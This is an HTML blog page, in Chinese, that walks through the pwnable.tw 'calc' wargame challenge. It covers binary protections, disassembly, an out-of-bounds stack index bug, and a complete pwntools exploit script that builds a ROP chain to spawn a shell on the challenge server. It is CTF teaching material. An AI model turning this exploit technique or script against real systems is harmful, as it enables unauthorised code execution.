@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" />
+
+    
+
+    
+
+    <title>pwnable.tw系列——calc | TinyMagicka</title>
+    <meta name="author" content="TinyMagicka" />
+    <meta name="version" content="1.0.0" />
+    <meta name="keywords" content="Android PWN" />
+    <meta name="description" content="这题一开始做的时候走了很多弯路代码很长，一开始看汇编看的累死了，我的笔记本里面的ida不带F5功能换用了 windows系统，使用了2017年泄漏的IDA 7 才能看到c代码
+这里只说一下解题的正确步骤 
+步骤1 初期查看gdb 装上peda插件使用checksec插件查看文件的防御机制
+1234567891011121314151617181920212223root@kali:~/tmp# gdb calcGNU gdb (Debian 7.12-6+b1) 7.12.0.20161007-" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no" />
+    <meta name="baidu-site-verification" content="F0CXvmUgA9" />
+
+    
+    
+    <link rel="icon" href="/images/favicon.png">
+    
+
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+
+    <div class="app">
+        <header class="header clearfix">
+    <div id="nav" class="nav">
+    <button id="open-panel" class="open-panel"><i class="icon-library"></i></button>
+
+    <nav class="nav-inner">
+
+        
+        
+        <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+        </li>
+        
+        
+        
+        <li class="nav-item nav-item-tag">
+            <a id="nav-tag" class="nav-link" href="#">标签</a>
+            <div id="nav-tags" class="nav-tag-wrap">
+                <i class="nav-tag-arrow"></i>
+                
+  <div class="widget-wrap">
+    <h3 class="widget-title">
+        <i class="icon-tag vm"></i>
+        <span class="vm">Mot-clés</span>
+    </h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Papers/">Papers</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/metasploit/">metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable-tw系列/">pwnable.tw系列</a></li></ul>
+    </div>
+  </div>
+
+
+            </div>
+        </li>
+        
+        
+        
+        <li class="nav-item">
+            <a class="nav-link" href="/archives">归档</a>
+        </li>
+        
+        
+        
+        <li class="nav-item">
+            <a class="nav-link" href="/about">关于</a>
+        </li>
+        
+        
+        
+
+    </nav>
+</div>
+
+    <aside id="aside" class="aside">
+    <div id="aside-mask" class="aside-mask"></div>
+    <div id="aside-inner" class="aside-inner">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit"><i class="icon-search-stroke"></i></button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+
+        
+        
+        
+        
+
+        
+        <ol class="toc"><li class="toc-item toc-level-6"><a class="toc-link" href="#步骤1-初期查看"><span class="toc-number">1.</span> <span class="toc-text">步骤1 初期查看</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#步骤2-确认攻击方法"><span class="toc-number">2.</span> <span class="toc-text">步骤2 确认攻击方法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#步骤3-确认漏洞点"><span class="toc-number">3.</span> <span class="toc-text">步骤3 确认漏洞点</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#步骤4-漏洞利用"><span class="toc-number">4.</span> <span class="toc-text">步骤4 漏洞利用</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#步骤5-：难点"><span class="toc-number">5.</span> <span class="toc-text">步骤5 ：难点</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#exp"><span class="toc-number">6.</span> <span class="toc-text">exp</span></a></li></ol>
+        
+    </div>
+</aside>
+
+</header>
+
+        <div id="content" class="content"><article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            pwnable.tw系列——calc
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="/2017/10/06/pwnable-tw-calc/">
+    
+    <i class="icon-calendar"></i>
+    
+    <time datetime="2017-10-06T13:50:00.000Z" itemprop="datePublished">2017-10-06</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag"></i>
+    <a class="article-tag-link" href="/tags/pwn/">pwn</a>, <a class="article-tag-link" href="/tags/pwnable-tw系列/">pwnable.tw系列</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>这题一开始做的时候走了很多弯路<br>代码很长，一开始看汇编看的累死了，<br>我的笔记本里面的ida不带F5功能<br>换用了 windows系统，使用了2017年泄漏的IDA 7 才能看到c代码<br><a id="more"></a></p>
+<p>这里只说一下解题的正确步骤 </p>
+<h6 id="步骤1-初期查看"><a href="#步骤1-初期查看" class="headerlink" title="步骤1 初期查看"></a>步骤1 初期查看</h6><p>gdb 装上peda插件<br>使用checksec插件查看文件的防御机制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/tmp# gdb calc</span><br><span class="line">GNU gdb (Debian 7.12-6+b1) 7.12.0.20161007-git</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">Reading symbols from calc...(no debugging symbols found)...done.</span><br><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>
+<p>可以看到 开启了NX，CANARY 但是没开ASLR（PIE）<br>说明不能注入代码了。但是幸好没开ASLR所以可以ret2libc</p>
+<h6 id="步骤2-确认攻击方法"><a href="#步骤2-确认攻击方法" class="headerlink" title="步骤2 确认攻击方法"></a>步骤2 确认攻击方法</h6><p>在ida里面查看一下导入的库函数，没有发现system或者execve<br>说明最后需要使用ROP攻击调用int 0x80<br>这里就明确目标了————寻找可以劫持EIP的地方</p>
+<h6 id="步骤3-确认漏洞点"><a href="#步骤3-确认漏洞点" class="headerlink" title="步骤3 确认漏洞点"></a>步骤3 确认漏洞点</h6><p>一开始是直接观察汇编代码，但是太长了看的有点烦<br>使用IDA查看c代码。<br>当然需要一边看c一边参照汇编修改函数的参数和变量类型<br>做到<strong>完全理解</strong>函数功能<br>理解之后就可以发现：<br>calc里面用来保存用户输入的int型变量数组的第一个变量var_5A0可以被覆盖：</p>
+<p>calc函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">public calc</span><br><span class="line">calc proc near</span><br><span class="line"></span><br><span class="line">var_5A0= dword ptr -5A0h      ; 用来保存int数组中的索引</span><br><span class="line">var_59C= dword ptr -59Ch      ； int数组</span><br><span class="line">var_40C= byte ptr -40Ch       </span><br><span class="line">var_C= dword ptr -0Ch</span><br><span class="line"></span><br><span class="line">push    ebp             </span><br><span class="line">mov     ebp, esp</span><br><span class="line">sub     esp, 5B8h</span><br><span class="line">mov     eax, large gs:14h</span><br><span class="line">mov     [ebp+var_C], eax ; 开启canary栈保护</span><br><span class="line">xor     eax, eax</span><br></pre></td></tr></table></figure></p>
+<p>覆盖var_5A0的地方在parse_expr函数中（请自己寻找）<br>演示覆盖变量的步骤是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/tmp# nc chall.pwnable.tw 10100</span><br><span class="line">=== Welcome to SECPROG calculator ===</span><br><span class="line">+361</span><br><span class="line">134517913</span><br><span class="line">+361-134517913</span><br><span class="line">0</span><br><span class="line">+361</span><br><span class="line">0</span><br></pre></td></tr></table></figure></p>
+<p>想想是怎么做到的<br>实际上输入+361之后返回的是calc的返回地址的数值<br>可以验证 ：134517913 = 0x08049499<br>main函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:08049452 ; Attributes: bp-based frame</span><br><span class="line">.text:08049452</span><br><span class="line">.text:08049452                 public main</span><br><span class="line">.text:08049452 main            proc near               ; DATA XREF: _start+17o</span><br><span class="line">.text:08049452                 push    ebp</span><br><span class="line">.text:08049453                 mov     ebp, esp</span><br><span class="line">.text:08049455                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:08049458                 sub     esp, 10h</span><br><span class="line">.text:0804945B                 mov     dword ptr [esp+4], offset timeout</span><br><span class="line">.text:08049463                 mov     dword ptr [esp], 0Eh</span><br><span class="line">.text:0804946A                 call    ssignal         ; 设置接受信号SIGALRM （0x0E）时候的处理函数：timeout</span><br><span class="line">.text:0804946F                 mov     dword ptr [esp], 3Ch</span><br><span class="line">.text:08049476                 call    alarm           ; 设置0x3c秒之后发送一个SIGALRM信号给本程序</span><br><span class="line">.text:0804947B                 mov     dword ptr [esp], offset aWelcomeToSecpr ; &quot;=== Welcome to SECPROG calculator ===&quot;</span><br><span class="line">.text:08049482                 call    puts</span><br><span class="line">.text:08049487                 mov     eax, stdout</span><br><span class="line">.text:0804948C                 mov     [esp], eax</span><br><span class="line">.text:0804948F                 call    fflush</span><br><span class="line">.text:08049494                 call    calc</span><br><span class="line">.text:08049499                 mov     dword ptr [esp], offset aMerryChristmas ; &quot;Merry Christmas!&quot;</span><br><span class="line">.text:080494A0                 call    puts</span><br><span class="line">.text:080494A5                 leave</span><br><span class="line">.text:080494A6                 retn</span><br><span class="line">.text:080494A6 main            endp</span><br></pre></td></tr></table></figure></p>
+<h6 id="步骤4-漏洞利用"><a href="#步骤4-漏洞利用" class="headerlink" title="步骤4 漏洞利用"></a>步骤4 漏洞利用</h6><p>实际上上面操作实例中<br>输入+361之后<br>使得var_5A0 = 361<br>显示的是var_59C[361]的值<br>也是calc的返回地址</p>
+<p>所以修改这一部分栈值构建ROP链组成：<br>mov eax， 11<br>mov ebx， “/bin/sh”<br>mov ecx, 0<br>mov edx, 0<br>int 0x80</p>
+<p>使用REOPgadget很容易构造ROP链       </p>
+<h6 id="步骤5-：难点"><a href="#步骤5-：难点" class="headerlink" title="步骤5 ：难点"></a>步骤5 ：难点</h6><p>如何确定/bin/sh   在栈中的地址？</p>
+<p>calc是被main调用的<br>在calc执行到ret的时候，ebp的值已经不是calc的栈底了，被复原了<br>复原后的ebp是啥呢？<br>是main的栈地<br>于是只要知道ebp的内容，就可以推倒出我们输入的字符串“/bin/sh”的地址了<br>获取ebp的内容：var_59C[360]就是了。</p>
+<h6 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h6><p>exp写的不够优雅</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;chall.pwnable.tw&quot;,  10100)</span><br><span class="line">#p = process(&apos;/root/tmp/calc&apos;)</span><br><span class="line">p.recvuntil(&quot;=== Welcome to SECPROG calculator ===\n&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gadget = &quot;&quot;&quot;</span><br><span class="line">0x080701d0 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x00000000 : </span><br><span class="line">0x00000000 : </span><br><span class="line">0xffffd260 : address of &quot;/bin/sh&quot;, use ebp(main esp)+8</span><br><span class="line">0x080550d0 : xor eax, eax ; ret</span><br><span class="line">0x0808f936 : mov eax, 0xc ; pop edi ; ret</span><br><span class="line">0x080c385d : padding</span><br><span class="line">0x08065773 : dec eax ; ret</span><br><span class="line">0x0807087f : nop ; int 0x80</span><br><span class="line">0x6e69622f : /bin</span><br><span class="line">0x0068732f : /sh</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">addrs = []</span><br><span class="line">for i in gadget.split(&apos;\n&apos;)[1:-1]:</span><br><span class="line">    addrs.append(str(int(i.split(&apos; : &apos;)[0], 16)))</span><br><span class="line"></span><br><span class="line">for i in range(len(addrs)):</span><br><span class="line">    s = &quot;+&quot; + str(0x5a4 / 4 + i)+&quot;\n&quot;</span><br><span class="line">    p.send(s)</span><br><span class="line">    value = p.recvuntil(&apos;\n&apos;).strip()</span><br><span class="line">    if value == &quot;0&quot;:</span><br><span class="line">        s = &quot;+&quot; + str(0x5a4 / 4 + i)</span><br><span class="line">    elif value[0] == &apos;-&apos;:</span><br><span class="line">        s = &quot;+&quot; + str(0x5a4 / 4 + i) + &quot;+&quot; + value[1:]</span><br><span class="line">    else :</span><br><span class="line">        s = &quot;+&quot; + str(0x5a4 / 4 + i) + &quot;-&quot; + value</span><br><span class="line">    if i == 3:</span><br><span class="line">        p.send(&quot;+360\n&quot;)</span><br><span class="line">        esp = p.recvuntil(&apos;\n&apos;).strip()</span><br><span class="line">        if esp[0] == &apos;-&apos;:</span><br><span class="line">            s = s + esp+&quot;+8\n&quot;</span><br><span class="line">        else:</span><br><span class="line">            s = s + &quot;+&quot;+esp+&quot;+8\n&quot;</span><br><span class="line">    else:</span><br><span class="line">        if addrs[i] == &quot;0&quot;:</span><br><span class="line">            s = s + &apos;\n&apos;</span><br><span class="line">        else:</span><br><span class="line">            s = s + &quot;+&quot; + addrs[i] + &apos;\n&apos;</span><br><span class="line">    print s</span><br><span class="line">    p.send(s)</span><br><span class="line">    p.recvuntil(&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">p.send(&quot;$\n&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+        
+    </section>
+</article>
+
+
+
+<div class="comments">
+    <div id="disqus_thread">
+        <p class="comment-tips">国内查看评论需要代理~</p>
+    </div>
+    <script>
+    window.disqus_config = function () {
+        this.language = 'zh';
+        this.page.url = 'http://yoursite.com/2017/10/06/pwnable-tw-calc/';
+        this.page.title = 'pwnable.tw系列——calc';
+        this.page.identifier = '2017/10/06/pwnable-tw-calc/';
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = 'https://name.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+</div>
+        <footer class="footer">
+    Propulsé by <a href="http://hexo.io/" target="_blank">Hexo</a>, Theme by <a href="https://github.com/sanonz/hexo-theme-concise" target="_blank">Concise</a>
+</footer>
+
+<script type="text/javascript" src="//s13.cnzz.com/z_stat.php?id=1234567890&amp;web_id=1234567890"></script>
+
+
+    </div>
+
+    <script type="text/javascript" src="https://cdn.bootcss.com/jquery/1.9.0/jquery.min.js"></script>
+    
+    <script type="text/javascript" src="/js/scrollspy.min.js"></script>
+    
+    <script type="text/javascript">
+        $(function() {
+            var nodes = {
+                nav: $('#nav'),
+                aside: $('#aside'),
+                navTags: $('#nav-tags')
+            };
+
+            $('#open-panel, #aside-mask').on('click', function() {
+                nodes.aside.toggleClass('panel-show');
+            });
+            $('#nav-tag').on('click', function(event) {
+                event.preventDefault();console.log(nodes.navTags.attr('class'))
+                nodes.navTags.toggleClass('tag-show');console.log(nodes.navTags.attr('class'))
+            })/*.hover(function() {
+                nodes.navTags.addClass('tag-show');
+            }, function() {
+                nodes.navTags.removeClass('tag-show');
+            });*/
+
+            
+            $(document.body).scrollspy({target: '#aside-inner'});
+            
+        });
+    </script>
+
+</body>
+</html>
